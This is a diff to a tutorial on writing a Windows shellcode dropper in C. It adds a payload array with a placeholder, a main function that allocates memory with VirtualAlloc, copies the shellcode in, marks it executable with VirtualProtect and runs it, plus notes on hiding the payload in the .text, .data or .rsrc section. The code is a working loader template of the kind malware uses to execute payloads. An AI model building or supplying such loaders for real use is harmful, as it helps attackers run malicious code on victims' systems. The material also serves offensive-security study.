@@ -50,12 +50,18 @@ Lastly we make use of the ```CreateThread``` API to execute our code in a new th
 Our template for our dropper should now look like this:
 
 ```c#
-	
+unsigned char payload[] = {SHELLCODE};
+unsigned int payload_length = 4;
+```
+
+```c#
+int main(void) {
+
 	// Reserve space in memory for our payload
   me_reserve = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	// Move the payload to the newly reserved space.
-	RtlMoveMemory(me_reserve, payload, payload_length);
+  RtlMoveMemory(me_reserve, payload, payload_length);
 	
 	// Change the memory protection to add execute permissions
 	mem_protect = VirtualProtect(me_reserve, payload_length, PAGE_EXECUTE_READ, &oldprotect);
@@ -71,6 +77,10 @@ Our template for our dropper should now look like this:
 
 ```
 
+The differences in the code comes in w.r.t to which section you would like to use for your payload.
 
+If you want to use the ```.text``` section, you need to assign your payload as a local variable. So within the main function of the application.
+If you want to use the ```.data``` section, you need to assign your payload as a global variable. So outside of the main function of the application.
 
+The use of the ```.rsrc``` section is slightly more complex.
 
